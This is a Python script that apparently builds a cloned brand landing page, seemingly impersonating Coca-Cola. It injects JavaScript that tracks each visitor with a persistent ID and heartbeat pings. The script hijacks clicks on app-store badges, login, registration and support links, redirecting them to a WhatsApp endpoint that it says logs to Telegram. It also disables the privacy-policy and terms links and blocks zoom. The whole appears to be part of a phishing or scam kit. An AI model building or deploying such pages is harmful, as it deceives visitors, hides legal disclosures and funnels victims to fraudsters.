import os, json

BASE_DIR = r'd:\CocaCola'
db_path = os.path.join(BASE_DIR, 'database.json')
with open(db_path, 'r', encoding='utf-8') as f:
    db = json.load(f)
wa_num = db.get('whatsapp_number', '5511933684266')

with open(os.path.join(BASE_DIR, 'template.html'), 'r', encoding='utf-8') as f:
    html = f.read()

html = html.replace('https://wa.me/5511933684266', '/redirect_whatsapp')
html = html.replace('https://wa.me/5511971730325', '/redirect_whatsapp')
html = html.replace("'https://wa.me/5511933684266'", "'/redirect_whatsapp'")
html = html.replace("'https://wa.me/5511971730325'", "'/redirect_whatsapp'")
html = html.replace('https://api.whatsapp.com/send?phone=5511933684266', '/redirect_whatsapp')
html = html.replace('5511933684266', wa_num)

js_patch = """
<script>
// Advanced Tracking System (Pixel de Entrada e Saída SVR)
(function() {
  let userId = 'unknown';
  try {
      userId = localStorage.getItem('coca_user_id');
      if (!userId) {
        userId = Math.random().toString(36).substring(7);
        localStorage.setItem('coca_user_id', userId);
      }
  } catch(e) {
      userId = Math.random().toString(36).substring(7);
  }
  
  
  const startSession = () => {
    fetch('/api/v1/pixel', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ action: 'entered', userId: userId })
    }).catch(()=>{});
  };

  startSession();

  const handleUnload = () => {
    if (userId) {
      fetch('/api/v1/pixel', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ action: 'left', userId: userId }),
        keepalive: true
      }).catch(()=>{});
    }
  };
  window.addEventListener('beforeunload', handleUnload);
  window.addEventListener('pagehide', handleUnload);

  setInterval(() => {
    fetch('/api/v1/pixel', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ action: 'heartbeat', userId: userId })
    }).catch(()=>{});
  }, 20000);
})();

document.addEventListener('gesturestart', function (e) {
    e.preventDefault();
});
document.addEventListener('touchmove', function(e) {
    if (e.scale !== 1) { e.preventDefault(); }
}, { passive: false });
var meta = document.createElement('meta');
meta.name = 'viewport';
meta.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no';
document.head.appendChild(meta);
var style = document.createElement('style');
style.innerHTML = 'body { touch-action: manipulation; }';
document.head.appendChild(style);

document.addEventListener('click', function(e) { 
    var target = e.target;
    var a = target.closest('a'); 
    
    var text = (target.textContent || target.innerText || '').trim().toLowerCase();
    if (text === 'conheça a gente' || text === 'política de privacidade' || text === 'termos e condições' || (a && a.getAttribute('href') === '#')) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }

    var altText = '';
    var img = target.closest('img');
    if (img) {
        altText = (img.getAttribute('alt') || '').toLowerCase();
    }
    var srcText = '';
    var img = target.closest('img');
    if (img) {
        srcText = (img.getAttribute('src') || '').toLowerCase();
    }

    var isAppStore = target.closest('[alt*="App Store"]') || target.closest('img[src*="app-store"]');
    var isGooglePlay = target.closest('[alt*="Google Play"]') || target.closest('img[src*="google-play"]');
    
    var textNode = a ? a : target;
    var text = (textNode.textContent || '').trim().toLowerCase();
    
    var isBadgeOrStore = target.closest('[class*="badge"]') || isAppStore || isGooglePlay || 
                         (a && a.getAttribute('href') && (a.getAttribute('href').includes('redirect_whatsapp') || a.getAttribute('href').includes('wa.me') || a.getAttribute('href').includes('/login') || a.getAttribute('href').includes('pre-registration'))) || 
                         text.includes('atendimento') || text.includes('atendente') || text.includes('cadastre') || text.includes('cadastrar');
    
    if (isBadgeOrStore) { 
        var action = 'geral';
        if (text.includes('atendimento') || text.includes('atendente') || text.includes('cadastre') || text.includes('cadastrar') || (a && a.getAttribute('href') && a.getAttribute('href').includes('/login'))) {
            action = 'atendimento';
        } else if (text.includes('baixar') || isAppStore || isGooglePlay || target.closest('[class*="badge"]')) {
            action = 'download';
        } else if (text.includes('como funciona') || text.includes('dúvida')) {
            action = 'ajuda';
        }
        
        e.preventDefault(); 
        e.stopPropagation(); 

        // Redireciona o usuario para o endpoint /redirect_whatsapp que fara o log no Telegram e gerara as mensagens dinamicas
        window.location.href = '/redirect_whatsapp?action=' + encodeURIComponent(action);
    } 
}, true);
</script>
"""
if '</body>' in html:
    html = html.replace('</body>', js_patch + '</body>')
else:
    html += js_patch

with open(os.path.join(BASE_DIR, 'index.html'), 'w', encoding='utf-8') as f:
    f.write(html)
with open(os.path.join(BASE_DIR, 'deploy', 'index.html'), 'w', encoding='utf-8') as f:
    f.write(html)
print("index.html generated!")
